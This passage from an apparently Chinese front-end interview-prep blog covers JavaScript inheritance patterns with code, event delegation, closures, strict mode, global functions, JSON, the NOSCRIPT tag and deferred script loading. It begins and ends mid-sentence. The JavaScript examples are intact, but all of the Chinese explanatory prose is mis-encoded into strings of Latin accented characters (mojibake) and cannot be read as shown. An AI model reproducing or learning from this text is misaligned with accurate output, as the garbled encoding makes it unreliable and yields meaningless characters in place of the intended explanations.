å‡½æ•°æ¨¡å¼å°±æ˜¯æ¯”å·¥å‚æ¨¡å¼åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œå¤šä½¿ç”¨äº†ä¸€ä¸ªnewã€‚è¿™æ ·æ—¢ä¸ç”¨ä¿®æ”¹åŸæ¥çš„æ„é€ å‡½æ•°ï¼Œä¹Ÿè¾¾åˆ°äº†æ‰©å±•å¯¹è±¡çš„ç›®çš„(æ¯”å¦‚æˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªå…·æœ‰é¢å¤–æ–¹æ³•çš„ç‰¹æ®Šæ•°ç»„ï¼Œä½†æ˜¯åˆä¸æƒ³ç›´æ¥ä¿®æ”¹Arrayæ„é€ å‡½æ•°)ã€‚<strong>ç¼ºç‚¹</strong>å’Œå·¥å‚æ¨¡å¼ä¸€æ ·ï¼Œæ— æ³•å®ç°å¯¹è±¡çš„è¯†åˆ«ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">&#x27;kevin&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> Person) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript-ç»§æ‰¿çš„å‡ ç§å®ç°æ–¹å¼ï¼Ÿ"><a href="#JavaScript-ç»§æ‰¿çš„å‡ ç§å®ç°æ–¹å¼ï¼Ÿ" class="headerlink" title="JavaScript ç»§æ‰¿çš„å‡ ç§å®ç°æ–¹å¼ï¼Ÿ"></a>JavaScript ç»§æ‰¿çš„å‡ ç§å®ç°æ–¹å¼ï¼Ÿ</h2><p>å…·ä½“å¯å‚è€ƒ<a href="https://juejin.cn/post/6844903475021627400">JSåŸå‹é“¾ä¸ç»§æ‰¿åˆ«å†è¢«é—®å€’äº†</a>ã€‚</p><p>ï¼ˆ1ï¼‰ä»¥<strong>åŸå‹é“¾</strong>çš„æ–¹å¼ã€‚ç¼ºç‚¹æ˜¯åœ¨åŒ…å«æœ‰å¼•ç”¨ç±»å‹çš„æ•°æ®æ—¶ï¼Œä¼šè¢«æ‰€æœ‰çš„å®ä¾‹å¯¹è±¡æ‰€å…±äº«ï¼Œå®¹æ˜“é€ æˆä¿®æ”¹çš„æ··ä¹±ã€‚è¿˜æœ‰å°±æ˜¯åœ¨åˆ›å»ºå­ç±»å‹çš„æ—¶å€™ä¸èƒ½å‘è¶…ç±»å‹ä¼ é€’å‚æ•°ã€‚</p><p>ï¼ˆ2ï¼‰å€Ÿç”¨<strong>æ„é€ å‡½æ•°</strong>ã€‚è¿™ç§æ–¹å¼æ˜¯é€šè¿‡åœ¨å­ç±»å‹çš„å‡½æ•°ä¸­è°ƒç”¨è¶…ç±»å‹çš„æ„é€ å‡½æ•°æ¥å®ç°çš„ï¼Œè¿™ä¸€ç§æ–¹æ³•è§£å†³äº†ä¸èƒ½å‘è¶…ç±»å‹ä¼ é€’å‚æ•°çš„ç¼ºç‚¹ï¼Œä½†æ˜¯å®ƒå­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ— æ³•å®ç°å‡½æ•°æ–¹æ³•çš„å¤ç”¨ï¼Œå¹¶ä¸”è¶…ç±»å‹åŸå‹å®šä¹‰çš„æ–¹æ³•å­ç±»å‹ä¹Ÿæ²¡æœ‰åŠæ³•è®¿é—®åˆ°ã€‚</p><p>ï¼ˆ3ï¼‰<strong>ç»„åˆç»§æ‰¿</strong>ã€‚ç»„åˆç»§æ‰¿æ˜¯å°†åŸå‹é“¾å’Œå€Ÿç”¨æ„é€ å‡½æ•°ç»„åˆèµ·æ¥ä½¿ç”¨çš„ä¸€ç§æ–¹å¼ã€‚æ ¸å¿ƒæ˜¯åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­é€šè¿‡ <code>Parent.call(this)</code> ç»§æ‰¿çˆ¶ç±»çš„å±æ€§ï¼Œç„¶åæ”¹å˜å­ç±»çš„åŸå‹ä¸º <code>new Parent()</code> æ¥ç»§æ‰¿çˆ¶ç±»çš„å‡½æ•°ã€‚è¿™ç§ç»§æ‰¿æ–¹å¼<strong>ä¼˜ç‚¹</strong>åœ¨äºæ„é€ å‡½æ•°å¯ä»¥ä¼ å‚ï¼Œä¸ä¼šä¸çˆ¶ç±»å¼•ç”¨å±æ€§å…±äº«ï¼Œå¯ä»¥å¤ç”¨çˆ¶ç±»çš„å‡½æ•°ï¼Œä½†æ˜¯<strong>ç¼ºç‚¹</strong>æ˜¯åœ¨ç»§æ‰¿çˆ¶ç±»å‡½æ•°çš„æ—¶å€™è°ƒç”¨äº†çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå¯¼è‡´å­ç±»çš„åŸå‹ä¸Šå¤šäº†ä¸éœ€è¦çš„çˆ¶ç±»å±æ€§ï¼Œå­˜åœ¨å†…å­˜ä¸Šçš„æµªè´¹ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.val = value</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.val)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  Parent.call(<span class="built_in">this</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">new</span> Child(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">child.getValue() <span class="comment">// 1</span></span><br><span class="line">child <span class="keyword">instanceof</span> Parent <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/25vMPF7DaKJxwU8.png" alt="image.png"></p><p>ï¼ˆ4ï¼‰<strong>åŸå‹å¼ç»§æ‰¿</strong>ã€‚åŸå‹å¼ç»§æ‰¿çš„ä¸»è¦æ€è·¯å°±æ˜¯åŸºäºå·²æœ‰çš„å¯¹è±¡æ¥åˆ›å»ºæ–°çš„å¯¹è±¡ï¼Œå®ç°çš„åŸç†æ˜¯ï¼Œå‘å‡½æ•°ä¸­ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè¿”å›ä¸€ä¸ªä»¥è¿™ä¸ªå¯¹è±¡ä¸ºåŸå‹çš„å¯¹è±¡ã€‚è¿™ç§ç»§æ‰¿çš„æ€è·¯ä¸»è¦ä¸æ˜¯ä¸ºäº†å®ç°åˆ›é€ ä¸€ç§æ–°çš„ç±»å‹ï¼Œåªæ˜¯å¯¹æŸä¸ªå¯¹è±¡å®ç°ä¸€ç§ç®€å•ç»§æ‰¿ï¼ŒES5 ä¸­å®šä¹‰çš„ Object.create() æ–¹æ³•å°±æ˜¯åŸå‹å¼ç»§æ‰¿çš„å®ç°ã€‚ç¼ºç‚¹ä¸åŸå‹é“¾æ–¹å¼ç›¸åŒã€‚</p><p>ï¼ˆ5ï¼‰<strong>å¯„ç”Ÿå¼ç»§æ‰¿</strong>ã€‚å¯„ç”Ÿå¼ç»§æ‰¿çš„æ€è·¯æ˜¯åˆ›å»ºä¸€ä¸ªç”¨äºå°è£…ç»§æ‰¿è¿‡ç¨‹çš„å‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå¤åˆ¶ä¸€ä¸ªå¯¹è±¡çš„å‰¯æœ¬ï¼Œç„¶åå¯¹è±¡è¿›è¡Œæ‰©å±•ï¼Œæœ€åè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªæ‰©å±•çš„è¿‡ç¨‹å°±å¯ä»¥ç†è§£æ˜¯ä¸€ç§ç»§æ‰¿ã€‚è¿™ç§ç»§æ‰¿çš„ä¼˜ç‚¹å°±æ˜¯å¯¹ä¸€ä¸ªç®€å•å¯¹è±¡å®ç°ç»§æ‰¿ï¼Œå¦‚æœè¿™ä¸ªå¯¹è±¡ä¸æ˜¯æˆ‘ä»¬çš„è‡ªå®šä¹‰ç±»å‹æ—¶ã€‚ç¼ºç‚¹æ˜¯æ²¡æœ‰åŠæ³•å®ç°å‡½æ•°çš„å¤ç”¨ã€‚</p><p>ï¼ˆ6ï¼‰<strong>å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿</strong>ã€‚ç»„åˆç»§æ‰¿çš„ç¼ºç‚¹å°±æ˜¯ä½¿ç”¨è¶…ç±»å‹çš„å®ä¾‹åšä¸ºå­ç±»å‹çš„åŸå‹ï¼Œå¯¼è‡´æ·»åŠ äº†ä¸å¿…è¦çš„åŸå‹å±æ€§ã€‚å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿çš„æ ¸å¿ƒæ˜¯å°†çˆ¶ç±»çš„åŸå‹èµ‹å€¼ç»™äº†å­ç±»ï¼Œå¹¶ä¸”å°†æ„é€ å‡½æ•°è®¾ç½®ä¸ºå­ç±»ï¼Œè¿™æ ·æ—¢è§£å†³äº†æ— ç”¨çš„çˆ¶ç±»å±æ€§é—®é¢˜ï¼Œè¿˜èƒ½æ­£ç¡®çš„æ‰¾åˆ°å­ç±»çš„æ„é€ å‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åœ¨ç»„åˆç»§æ‰¿çš„ä»£ç åŸºç¡€ä¸Šï¼ŒChild.prototype = new Parent() æ”¹ä¸º:</span></span><br><span class="line">Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype, &#123;</span><br><span class="line">  <span class="attr">constructor</span>: &#123;</span><br><span class="line">    <span class="attr">value</span>: Child,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/ZqK1HvNfya8PXn5.png" alt="image.png"></p><p>ï¼ˆ7ï¼‰<strong>Class ç»§æ‰¿</strong>ã€‚ES6 å¯ä»¥ä½¿ç”¨ <code>class</code> å»å®ç°ç»§æ‰¿ã€‚æ ¸å¿ƒåœ¨äºä½¿ç”¨ <code>extends</code> è¡¨æ˜ç»§æ‰¿è‡ªå“ªä¸ªçˆ¶ç±»ï¼Œå¹¶ä¸”åœ¨å­ç±»æ„é€ å‡½æ•°ä¸­å¿…é¡»è°ƒç”¨ <code>super</code>ï¼Œå› ä¸ºè¿™æ®µä»£ç å¯ä»¥çœ‹æˆ <code>Parent.call(this, value)</code>ã€‚ï¼ˆ<code>class</code> çš„æœ¬è´¨å°±æ˜¯å‡½æ•°ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = value</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getValue</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.val)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(value)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="number">1</span>)</span><br><span class="line">child.getValue() <span class="comment">// 1</span></span><br><span class="line">child <span class="keyword">instanceof</span> Parent <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="äº‹ä»¶å§”æ‰˜æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå…·ä½“å®ç°è§å®ç°éƒ¨åˆ†ï¼‰"><a href="#äº‹ä»¶å§”æ‰˜æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå…·ä½“å®ç°è§å®ç°éƒ¨åˆ†ï¼‰" class="headerlink" title="äº‹ä»¶å§”æ‰˜æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå…·ä½“å®ç°è§å®ç°éƒ¨åˆ†ï¼‰"></a>äº‹ä»¶å§”æ‰˜æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆå…·ä½“å®ç°è§å®ç°éƒ¨åˆ†ï¼‰</h2><p>äº‹ä»¶å§”æ‰˜<strong>æœ¬è´¨</strong>ï¼šåˆ©ç”¨æµè§ˆå™¨äº‹ä»¶å†’æ³¡çš„æœºåˆ¶ã€‚å› ä¸ºäº‹ä»¶åœ¨å†’æ³¡è¿‡ç¨‹ä¸­ä¼šä¸Šä¼ åˆ°çˆ¶èŠ‚ç‚¹ï¼Œå¹¶ä¸”çˆ¶èŠ‚ç‚¹å¯ä»¥é€šè¿‡äº‹ä»¶å¯¹è±¡è·å–åˆ°ç›®æ ‡èŠ‚ç‚¹ï¼Œå› æ­¤å¯ä»¥æŠŠå­èŠ‚ç‚¹çš„ç›‘å¬å‡½æ•°å®šä¹‰åœ¨çˆ¶èŠ‚ç‚¹ä¸Šï¼Œç”±çˆ¶èŠ‚ç‚¹çš„ç›‘å¬å‡½æ•°ç»Ÿä¸€å¤„ç†å¤šä¸ªå­å…ƒç´ çš„äº‹ä»¶ã€‚</p><p>ä½¿ç”¨äº‹ä»¶ä»£ç†æˆ‘ä»¬å¯ä»¥ä¸å¿…è¦ä¸ºæ¯ä¸€ä¸ªå­å…ƒç´ éƒ½ç»‘å®šä¸€ä¸ªç›‘å¬äº‹ä»¶ï¼Œè¿™æ ·å‡å°‘äº†å†…å­˜ä¸Šçš„æ¶ˆè€—ã€‚å¹¶ä¸”è¿˜å¯ä»¥å®ç°äº‹ä»¶çš„åŠ¨æ€ç»‘å®šï¼Œæ¯”å¦‚è¯´æ–°å¢äº†ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å•ç‹¬åœ°ä¸ºå®ƒæ·»åŠ ä¸€ä¸ªç›‘å¬äº‹ä»¶ï¼Œå®ƒæ‰€å‘ç”Ÿçš„äº‹ä»¶ä¼šäº¤ç»™çˆ¶å…ƒç´ ä¸­çš„ç›‘å¬å‡½æ•°æ¥å¤„ç†ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿï¼ˆé«˜é¢‘ï¼‰"><a href="#ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿï¼ˆé«˜é¢‘ï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿï¼ˆé«˜é¢‘ï¼‰"></a>ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿï¼ˆé«˜é¢‘ï¼‰</h2><p>é—­åŒ…ï¼š<strong>æœ‰æƒè®¿é—®å¦ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­å˜é‡çš„å‡½æ•°ã€‚</strong> â€”â€”ã€ŠJavaScripté«˜çº§ç¨‹åºè®¾è®¡ã€‹</p><p><strong>ï¼ˆå‡½æ•° A å†…éƒ¨æœ‰ä¸€ä¸ªå‡½æ•° Bï¼Œå‡½æ•° B å¯ä»¥è®¿é—®åˆ°å‡½æ•° A ä¸­çš„å˜é‡ï¼Œé‚£ä¹ˆå‡½æ•° B å°±æ˜¯é—­åŒ…ã€‚ï¼‰</strong></p><p>åˆ›å»ºé—­åŒ…çš„æœ€å¸¸è§çš„æ–¹å¼å°±æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°å†…åˆ›å»ºå¦ä¸€ä¸ªå‡½æ•°ï¼Œåˆ›å»ºçš„å‡½æ•°å¯ä»¥è®¿é—®åˆ°å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line">  <span class="built_in">window</span>.B = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(a)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">A()</span><br><span class="line">B() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>é—­åŒ…çš„<strong>ç”¨é€”</strong>ï¼š</p><ul><li>åœ¨å‡½æ•°å¤–éƒ¨èƒ½å¤Ÿè®¿é—®åˆ°å‡½æ•°å†…éƒ¨çš„å˜é‡ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•æ¥<strong>åˆ›å»ºç§æœ‰å˜é‡</strong>ã€‚</li><li>ä½¿å·²ç»è¿è¡Œç»“æŸçš„å‡½æ•°ä¸Šä¸‹æ–‡ä¸­çš„å˜é‡å¯¹è±¡ç»§ç»­ç•™åœ¨å†…å­˜ä¸­ã€‚å› ä¸ºé—­åŒ…å‡½æ•°ä¿ç•™äº†è¿™ä¸ªå˜é‡å¯¹è±¡çš„å¼•ç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªå˜é‡å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ã€‚</li><li>æ¨¡æ‹Ÿå—çº§ä½œç”¨åŸŸã€‚</li><li>åˆ›å»ºæ¨¡å—ã€‚</li></ul><p>é—­åŒ…çš„<strong>ç¼ºç‚¹</strong>ï¼šä¼šå¯¼è‡´å‡½æ•°çš„å˜é‡ä¸€ç›´ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿‡å¤šçš„é—­åŒ…å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p><h2 id="â€œuse-strictâ€-ç›®çš„-ä½¿ç”¨å®ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#â€œuse-strictâ€-ç›®çš„-ä½¿ç”¨å®ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="â€œuse strictâ€ ç›®çš„ ? ä½¿ç”¨å®ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>â€œuse strictâ€ ç›®çš„ ? ä½¿ç”¨å®ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>use strict æ˜¯ä¸€ç§ ECMAscript5 æ·»åŠ çš„ï¼ˆä¸¥æ ¼ï¼‰è¿è¡Œæ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼ä½¿å¾— Javascript åœ¨æ›´ä¸¥æ ¼çš„æ¡ä»¶ä¸‹è¿è¡Œã€‚è®¾ç«‹â€ä¸¥æ ¼æ¨¡å¼â€çš„ç›®çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li>æ¶ˆé™¤ Javascript è¯­æ³•çš„ä¸€äº›ä¸åˆç†ã€ä¸ä¸¥è°¨ä¹‹å¤„ï¼Œå‡å°‘ä¸€äº›æ€ªå¼‚è¡Œä¸ºï¼›</li><li>æ¶ˆé™¤ä»£ç è¿è¡Œçš„ä¸€äº›ä¸å®‰å…¨ä¹‹å¤„ï¼Œä¿è¯ä»£ç è¿è¡Œçš„å®‰å…¨ï¼›</li><li>æé«˜ç¼–è¯‘å™¨æ•ˆç‡ï¼Œå¢åŠ è¿è¡Œé€Ÿåº¦ï¼›</li><li>ä¸ºæœªæ¥æ–°ç‰ˆæœ¬çš„ Javascript åšå¥½é“ºå«ã€‚</li></ul><p>åŒºåˆ«ï¼š</p><ul><li>ç¦æ­¢ä½¿ç”¨ with è¯­å¥ã€‚</li><li>ç¦æ­¢ this å…³é”®å­—æŒ‡å‘å…¨å±€å¯¹è±¡ã€‚this ä¸º undefined ï¼Œæ‰€ä»¥è®¿é—® this çš„å±æ€§å°±ä¼šæŠ¥é”™ã€‚</li><li>å¯¹è±¡ä¸èƒ½æœ‰é‡åçš„å±æ€§ã€‚</li></ul><h2 id="JavaScriptçš„å…¨å±€å‡½æ•°æœ‰å“ªäº›ï¼Ÿ"><a href="#JavaScriptçš„å…¨å±€å‡½æ•°æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="JavaScriptçš„å…¨å±€å‡½æ•°æœ‰å“ªäº›ï¼Ÿ"></a>JavaScriptçš„å…¨å±€å‡½æ•°æœ‰å“ªäº›ï¼Ÿ</h2><p>å…¨å±€å‡½æ•°æŒ‡çš„æ˜¯ ECMAScript ä¸­å®šä¹‰çš„ global æ–¹æ³•ã€‚</p><p>ç¼–ç ç›¸å…³ï¼š</p><p>  escape()ã€unescape()ã€encodeURI()ã€decodeURI()ã€</p><p>  encodeURIComponent()ã€decodeURIComponent()</p><p>æ•°æ®å¤„ç†ï¼š</p><p>  Number()ã€String()</p><p>æ•°å­—ç›¸å…³ï¼š</p><p>  isFinite()ã€isNaN()ã€parseFloat()ã€parseInt()</p><p>ç‰¹æ®Šï¼š</p><p>  eval()</p><h2 id="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å±äºæŸä¸ªç±»ï¼Ÿ"><a href="#å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å±äºæŸä¸ªç±»ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å±äºæŸä¸ªç±»ï¼Ÿ"></a>å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å±äºæŸä¸ªç±»ï¼Ÿ</h2><ul><li><p>ä½¿ç”¨ instanceof è¿ç®—ç¬¦æ¥åˆ¤æ–­æ„é€ å‡½æ•°çš„ prototype å±æ€§æ˜¯å¦å‡ºç°åœ¨å¯¹è±¡çš„åŸå‹é“¾ä¸­çš„ä»»ä½•ä½ç½®ã€‚</p></li><li><p>é€šè¿‡å¯¹è±¡çš„ constructor å±æ€§æ¥åˆ¤æ–­ï¼Œå¯¹è±¡çš„ constructor å±æ€§æŒ‡å‘è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼ä¸æ˜¯å¾ˆå®‰å…¨ï¼Œå› ä¸º constructor å±æ€§å¯ä»¥è¢«æ”¹å†™ã€‚</p></li><li><p>å¦‚æœéœ€è¦åˆ¤æ–­çš„æ˜¯æŸä¸ªå†…ç½®çš„å¼•ç”¨ç±»å‹çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>Object.prototype.toString()</code> æ–¹æ³•æ¥æ‰“å°å¯¹è±¡çš„ [[Class]] å±æ€§æ¥è¿›è¡Œåˆ¤æ–­ã€‚</p></li></ul><h2 id="å¯¹äº-JSON-çš„äº†è§£ï¼Ÿ"><a href="#å¯¹äº-JSON-çš„äº†è§£ï¼Ÿ" class="headerlink" title="å¯¹äº JSON çš„äº†è§£ï¼Ÿ"></a>å¯¹äº JSON çš„äº†è§£ï¼Ÿ</h2><p>JSON æ˜¯ä¸€ç§åŸºäºæ–‡æœ¬çš„è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚å®ƒå¯ä»¥è¢«ä»»ä½•çš„ç¼–ç¨‹è¯­è¨€è¯»å–å’Œä½œä¸ºæ•°æ®æ ¼å¼æ¥ä¼ é€’ã€‚åœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ JSON ä½œä¸ºå‰åç«¯æ•°æ®äº¤æ¢çš„æ–¹å¼ã€‚å‰ç«¯é€šè¿‡å°†ä¸€ä¸ªç¬¦åˆ JSON æ ¼å¼çš„æ•°æ®ç»“æ„åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œç„¶åä¼ é€’åˆ°åç«¯ã€‚åç«¯é€šè¿‡ JSON æ ¼å¼çš„å­—ç¬¦ä¸²è§£æåç”Ÿæˆå¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œä»¥æ­¤å®ç°å‰åç«¯æ•°æ®çš„ä¼ é€’ã€‚</p><p>JSON å’Œ js ä¸­çš„å¯¹è±¡ä¸æ˜¯ä¸€å›äº‹ï¼ŒJSON ä¸­å¯¹è±¡æ ¼å¼æ›´åŠ ä¸¥æ ¼ï¼Œæ¯”å¦‚è¯´åœ¨ JSON ä¸­å±æ€§å€¼ä¸èƒ½ä¸ºå‡½æ•°ï¼Œä¸èƒ½å‡ºç° NaN è¿™æ ·çš„å±æ€§å€¼ç­‰ï¼Œå› æ­¤å¤§å¤šæ•°çš„ js å¯¹è±¡æ˜¯ä¸ç¬¦åˆ JSON å¯¹è±¡çš„æ ¼å¼çš„ã€‚</p><p><code>JSON.stringify()</code>ï¼šé€šè¿‡ä¼ å…¥ä¸€ä¸ªç¬¦åˆ JSON æ ¼å¼çš„æ•°æ®ç»“æ„ï¼Œå°†å…¶è½¬æ¢ä¸ºä¸€ä¸ª JSON å­—ç¬¦ä¸²ã€‚å¦‚æœä¼ å…¥çš„æ•°æ®ç»“æ„ä¸ç¬¦åˆ JSON æ ¼å¼ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¯¹è¿™äº›å€¼è¿›è¡Œå¯¹åº”çš„ç‰¹æ®Šå¤„ç†ï¼Œä½¿å…¶ç¬¦åˆè§„èŒƒã€‚åœ¨å‰ç«¯å‘åç«¯å‘é€æ•°æ®æ—¶ï¼Œå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å°†æ•°æ®å¯¹è±¡è½¬åŒ–ä¸º JSON æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</p><p> <code>JSON.parse()</code> ï¼šå°† JSON æ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºä¸€ä¸ª js æ•°æ®ç»“æ„ï¼Œå¦‚æœä¼ å…¥çš„å­—ç¬¦ä¸²ä¸æ˜¯æ ‡å‡†çš„ JSON æ ¼å¼çš„å­—ç¬¦ä¸²çš„è¯ï¼Œå°†ä¼šæŠ›å‡ºé”™è¯¯ã€‚å½“ä»åç«¯æ¥æ”¶åˆ° JSON æ ¼å¼çš„å­—ç¬¦ä¸²æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥å°†å…¶è§£æä¸ºä¸€ä¸ª js æ•°æ®ç»“æ„ï¼Œä»¥æ­¤æ¥è¿›è¡Œæ•°æ®çš„è®¿é—®ã€‚</p><h2 id="NOSCRIPT-æ ‡ç­¾æ˜¯åšä»€ä¹ˆç”¨çš„ï¼Ÿ"><a href="#NOSCRIPT-æ ‡ç­¾æ˜¯åšä»€ä¹ˆç”¨çš„ï¼Ÿ" class="headerlink" title="NOSCRIPT æ ‡ç­¾æ˜¯åšä»€ä¹ˆç”¨çš„ï¼Ÿ"></a>NOSCRIPT æ ‡ç­¾æ˜¯åšä»€ä¹ˆç”¨çš„ï¼Ÿ</h2><p>ç”¨æ¥å®šä¹‰åœ¨è„šæœ¬æœªè¢«æ‰§è¡Œæ—¶çš„æ›¿ä»£å†…å®¹ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨æ£€æµ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒè„šæœ¬ï¼Œè‹¥ä¸æ”¯æŒè„šæœ¬åˆ™å¯ä»¥æ˜¾ç¤º NOSCRIPT æ ‡ç­¾é‡Œçš„ innerText ã€‚</p><h2 id="js-å»¶è¿ŸåŠ è½½çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"><a href="#js-å»¶è¿ŸåŠ è½½çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="js å»¶è¿ŸåŠ è½½çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"></a>js å»¶è¿ŸåŠ è½½çš„æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</h2><p>js å»¶è¿ŸåŠ è½½ï¼Œä¹Ÿå°±æ˜¯ç­‰é¡µé¢åŠ è½½å®Œæˆä¹‹åå†åŠ è½½ JavaScript æ–‡ä»¶ã€‚ js å»¶è¿ŸåŠ è½½æœ‰åŠ©äºæé«˜é¡µé¢åŠ è½½é€Ÿåº¦ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ul><li>defer å±æ€§</li><li>async 